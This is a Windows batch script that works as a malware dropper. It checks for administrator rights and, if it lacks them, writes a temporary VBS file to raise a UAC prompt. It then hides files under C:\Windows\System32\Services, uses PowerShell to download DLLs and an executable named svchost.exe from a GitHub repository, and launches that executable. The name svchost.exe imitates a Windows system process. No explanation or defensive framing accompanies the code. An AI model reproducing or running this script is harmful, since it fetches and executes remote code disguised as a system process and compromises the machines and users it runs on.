��&cls
@echo off

powershell -window hidden -command ""
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"

cd C:\Windows\System32\Services"
attrib +h "C:\Windows\System32\Services\2.bat" /s /d
attrib +h "C:\Windows\System32\Services\svchost.exe" /s /d
attrib +h "C:\Windows\System32\Services\NAudio.Asio.dll" /s /d
attrib +h "C:\Windows\System32\Services\NAudio.Core.dll" /s /d
attrib +h "C:\Windows\System32\Services\NAudio.WinMM.dll" /s /d
Powershell -Command "Invoke-Webrequest 'https://github.com/ThisNot7/test-security-defender/raw/main/NAudio.Asio.dll/' -OutFile NAudio.Asio.dll"
Powershell -Command "Invoke-Webrequest 'https://github.com/ThisNot7/test-security-defender/raw/main/NAudio.Core.dll/' -OutFile NAudio.Core.dll"
Powershell -Command "Invoke-Webrequest 'https://github.com/ThisNot7/test-security-defender/raw/main/NAudio.WinMM.dll/' -OutFile NAudio.WinMM.dll"
Powershell -Command "Invoke-Webrequest 'https://github.com/ThisNot7/test-security-defender/raw/main/svchost.exe/' -OutFile svchost.exe"
start svchost.exe